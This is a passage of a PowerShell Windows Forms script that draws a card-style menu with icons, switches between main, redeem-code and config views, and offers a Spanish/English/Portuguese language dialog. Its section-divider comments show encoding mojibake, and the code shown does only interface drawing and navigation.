    $g.DrawString($tagText,$fntTag,$tagBr,$tagX,$tagY)

    $cyanBr.Dispose();$whiteBr.Dispose();$tagBr.Dispose()
    $fntMain.Dispose();$fntTag.Dispose()

    # Separator
    $sp=New-Object System.Drawing.Pen([System.Drawing.Color]::FromArgb(25,255,255,255),1)
    $g.DrawLine($sp,$PAD,$s.Height-1,$s.Width-$PAD,$s.Height-1);$sp.Dispose()
})
$form.Controls.Add($hp)

# Small config gear in header (half-hidden)
$script:gearBtn=New-Object System.Windows.Forms.Label
$script:gearBtn.Text="config";$script:gearBtn.Font=$FntSub
$script:gearBtn.ForeColor=[System.Drawing.Color]::FromArgb(60,70,90);$script:gearBtn.BackColor=$BG
$script:gearBtn.AutoSize=$true;$script:gearBtn.Cursor=[System.Windows.Forms.Cursors]::Hand
$script:gearBtn.Location=New-Object System.Drawing.Point(($FW-60),($HH-25))
$script:gearBtn.Add_MouseEnter({$_.ForeColor=$script:Cyan})
$script:gearBtn.Add_MouseLeave({$_.ForeColor=[System.Drawing.Color]::FromArgb(60,70,90)})
$script:gearBtn.Add_Click({Switch-ToConfig})
$hp.Controls.Add($script:gearBtn)

# ÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚Â
#  CARD FACTORY
# ÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚Â
function New-Card{param([int]$X,[int]$Y,[int]$W,[int]$H,[string]$Title,[string]$Sub,[string]$Icon,[scriptblock]$Click)
    $pn=New-Object BufferedPanel
    $pn.Location=New-Object System.Drawing.Point($X,$Y)
    $pn.Size=New-Object System.Drawing.Size($W,$H);$pn.BackColor=$BG
    $pn.Cursor=[System.Windows.Forms.Cursors]::Hand
    $pn.Tag=@{Hover=$false;Icon=$Icon;Title=$Title;Sub=$Sub}
    $pn.Add_MouseEnter({param($s,$e2);$s.Tag.Hover=$true;$s.Invalidate()})
    $pn.Add_MouseLeave({param($s,$e2);$s.Tag.Hover=$false;$s.Invalidate()})
    if($Click){$pn.Add_Click($Click)}
    $pn.Add_Paint({
        param($s,$e)
        $g=$e.Graphics;$g.SmoothingMode='AntiAlias';$g.TextRenderingHint='ClearTypeGridFit'
        $n=$s.Tag;$bc=if($n.Hover){$script:CardHover}else{$script:CardBG}
        $p=New-RR 0 0 ($s.Width-1) ($s.Height-1) $CR
        $b1=New-Object System.Drawing.SolidBrush($bc);$b2=New-Object System.Drawing.Pen($script:CardBorder,1)
        $g.FillPath($b1,$p);$g.DrawPath($b2,$p);$b1.Dispose();$b2.Dispose();$p.Dispose()
        $tx2=56;$ty2=[int](($s.Height/2)-18);$sy2=[int](($s.Height/2)+3)
        $ic=30;$iy=[int]($s.Height/2)

        switch($n.Icon){
            "lightning"{
                $lBr=New-Object System.Drawing.SolidBrush($script:Cyan)
                $pts=@((New-Object System.Drawing.PointF(($ic+6),($iy-17))),(New-Object System.Drawing.PointF(($ic-2),($iy-2))),
                    (New-Object System.Drawing.PointF(($ic+5),($iy-2))),(New-Object System.Drawing.PointF(($ic-3),($iy+17))))
                # Fill solid bolt
                $boltPath=New-Object System.Drawing.Drawing2D.GraphicsPath
                $boltPath.AddPolygon(@(
                    (New-Object System.Drawing.PointF(($ic+5),($iy-17))),
                    (New-Object System.Drawing.PointF(($ic-4),($iy-1))),
                    (New-Object System.Drawing.PointF(($ic+1),($iy-1))),
                    (New-Object System.Drawing.PointF(($ic-1),($iy-4))),
                    (New-Object System.Drawing.PointF(($ic+6),($iy-4))),
                    (New-Object System.Drawing.PointF(($ic+8),($iy-17)))
                ))
                $g.FillPolygon($lBr, @(
                    (New-Object System.Drawing.PointF(($ic+1),($iy-18))),
                    (New-Object System.Drawing.PointF(($ic-6),($iy-1))),
                    (New-Object System.Drawing.PointF(($ic+2),($iy-1))),
                    (New-Object System.Drawing.PointF(($ic-4),($iy+18))),
                    (New-Object System.Drawing.PointF(($ic+3),($iy+4))),
                    (New-Object System.Drawing.PointF(($ic-2),($iy+4))),
                    (New-Object System.Drawing.PointF(($ic+7),($iy-12)))
                ))
                $lBr.Dispose()
            }
            "webpage"{
                $wp=New-Object System.Drawing.Pen($script:Cyan,1.8);$r3=12
                $g.DrawEllipse($wp,($ic-$r3),($iy-$r3),($r3*2),($r3*2))
                $g.DrawLine($wp,$ic,($iy-$r3),$ic,($iy+$r3))
                $g.DrawLine($wp,($ic-$r3),$iy,($ic+$r3),$iy)
                $g.DrawEllipse($wp,($ic-5),($iy-$r3),10,($r3*2))
                # External arrow
                $ap=New-Object System.Drawing.Pen($script:Cyan,2)
                $g.DrawLine($ap,($ic+5),($iy-9),($ic+13),($iy-9))
                $g.DrawLine($ap,($ic+13),($iy-9),($ic+13),($iy-1))
                $g.DrawLine($ap,($ic+13),($iy-9),($ic+6),($iy-2))
                $wp.Dispose();$ap.Dispose()
            }
            "globe"{
                $gp=New-Object System.Drawing.Pen($script:Cyan,1.6);$r3=12
                $g.DrawEllipse($gp,($ic-$r3),($iy-$r3),($r3*2),($r3*2))
                $g.DrawLine($gp,$ic,($iy-$r3),$ic,($iy+$r3))
                $g.DrawLine($gp,($ic-$r3),$iy,($ic+$r3),$iy)
                $g.DrawEllipse($gp,($ic-6),($iy-$r3),12,($r3*2))
                $gp.Dispose()
            }
            "trash"{
                $tp=New-Object System.Drawing.Pen($script:Cyan,1.8)
                $g.DrawLine($tp,($ic-11),($iy-10),($ic+11),($iy-10))
                $g.DrawLine($tp,($ic-3),($iy-10),($ic-3),($iy-14))
                $g.DrawLine($tp,($ic+3),($iy-10),($ic+3),($iy-14))
                $g.DrawLine($tp,($ic-3),($iy-14),($ic+3),($iy-14))
                $g.DrawLine($tp,($ic-9),($iy-8),($ic-7),($iy+14))
                $g.DrawLine($tp,($ic+9),($iy-8),($ic+7),($iy+14))
                $g.DrawLine($tp,($ic-7),($iy+14),($ic+7),($iy+14))
                $tn=New-Object System.Drawing.Pen($script:Cyan,1.2)
                $g.DrawLine($tn,$ic,($iy-5),$ic,($iy+10))
                $g.DrawLine($tn,($ic-4),($iy-5),($ic-4),($iy+10))
                $g.DrawLine($tn,($ic+4),($iy-5),($ic+4),($iy+10))
                $tp.Dispose();$tn.Dispose()
            }
            "discord"{
                if ($script:discordBmp) {
                    $g.InterpolationMode='HighQualityBicubic'
                    $isz=$script:iconSize;$ix2=$ic-[int]($isz/2);$iy2=$iy-[int]($isz/2)
                    $g.DrawImage($script:discordBmp,$ix2,$iy2,$isz,$isz)
                }
            }
            "tiktok"{
                if ($script:tiktokBmp) {
                    $g.InterpolationMode='HighQualityBicubic'
                    $isz=$script:iconSize;$ix2=$ic-[int]($isz/2);$iy2=$iy-[int]($isz/2)
                    $g.DrawImage($script:tiktokBmp,$ix2,$iy2,$isz,$isz)
                }
            }
        }
        $tb=New-Object System.Drawing.SolidBrush($script:White)
        $g.DrawString($n.Title,$script:FntCard,$tb,$tx2,$ty2);$tb.Dispose()
        if($n.Sub){$sb=New-Object System.Drawing.SolidBrush($script:Gray)
            $g.DrawString($n.Sub,$script:FntSub,$sb,$tx2,$sy2);$sb.Dispose()}
        $ab=New-Object System.Drawing.SolidBrush($script:Cyan)
        $asz=$g.MeasureString(">",$script:FntArrow)
        $g.DrawString(">",$script:FntArrow,$ab,$s.Width-$asz.Width-10,($s.Height-$asz.Height)/2);$ab.Dispose()
    })
    return $pn
}

# ÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚Â
#  VIEW SWITCHING
# ÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚Â
function Switch-ToRedeem{$script:mp.Visible=$false;$script:rp.Visible=$true;Refresh-Codes}
function Switch-ToMain{$script:rp.Visible=$false;$script:sp.Visible=$false;$script:mp.Visible=$true}
function Switch-ToConfig{$script:mp.Visible=$false;$script:sp.Visible=$true;$script:sWatcher.Invalidate()}
function Switch-FromConfig{$script:sp.Visible=$false;$script:mp.Visible=$true}
function Refresh-Codes{if($script:clp){$script:clp.Invalidate()}}

function Refresh-AllText{
    $script:c1.Tag.Title=T "activar";$script:c1.Tag.Sub=T "activarSub";$script:c1.Invalidate()
    $script:c3.Tag.Title=T "idioma";$script:c3.Tag.Sub=T "idiomaSub";$script:c3.Invalidate()
    $script:c4.Tag.Title=T "desinstalar";$script:c4.Tag.Sub=T "desinstalarSub";$script:c4.Invalidate()
    $script:cWeb.Tag.Title=T "web";$script:cWeb.Tag.Sub=T "webSub";$script:cWeb.Invalidate()
    $script:c5.Tag.Title=T "discord";$script:c5.Tag.Sub=T "discordSub";$script:c5.Invalidate()
    $script:c6.Tag.Title=T "tiktok";$script:c6.Tag.Sub=T "tiktokSub";$script:c6.Invalidate()
    $script:salBtn.Invalidate()
    $script:rTit.Text=T "canjear";$script:rSubL.Text=T "canjearSub"
    $script:codesT.Text=T "codigosActivos"
    $script:backB.Invalidate();$script:subB.Invalidate()
    $script:sBack.Invalidate();$script:sTitle.Text=T "config"
    Refresh-Codes
}

function Show-LangDialog{
    $dlg=New-Object System.Windows.Forms.Form
    $dlg.Text=T "selectIdioma";$dlg.ClientSize=New-Object System.Drawing.Size(260,180)
    $dlg.StartPosition="CenterParent";$dlg.BackColor=$BG
    $dlg.FormBorderStyle="FixedDialog";$dlg.MaximizeBox=$false;$dlg.MinimizeBox=$false;$dlg.ShowInTaskbar=$false
    $dlg.Add_HandleCreated({$v=[int]1;[DwmHelper]::DwmSetWindowAttribute($dlg.Handle,20,[ref]$v,4)|Out-Null})
    $opts=@(@("Espanol","es"),@("English","en"),@("Portugues","pt"));$by=15
    foreach($o in $opts){
        $btn=New-Object System.Windows.Forms.Button
        $btn.Text=$o[0];$btn.Tag=$o[1]
        $btn.Location=New-Object System.Drawing.Point(20,$by)
        $btn.Size=New-Object System.Drawing.Size(220,42)
        $btn.FlatStyle="Flat";$btn.Font=New-Object System.Drawing.Font("Bahnschrift SemiBold",11)
        $btn.ForeColor=$White;$btn.BackColor=$CardBG
        $btn.FlatAppearance.BorderColor=$CardBorder;$btn.FlatAppearance.MouseOverBackColor=$CardHover
        $btn.Cursor=[System.Windows.Forms.Cursors]::Hand
        $btn.Add_Click({param($sender);$script:currentLang=$sender.Tag;Refresh-AllText;$dlg.Close()})
        $dlg.Controls.Add($btn);$by+=50
    }
    $dlg.ShowDialog()|Out-Null;$dlg.Dispose()
}

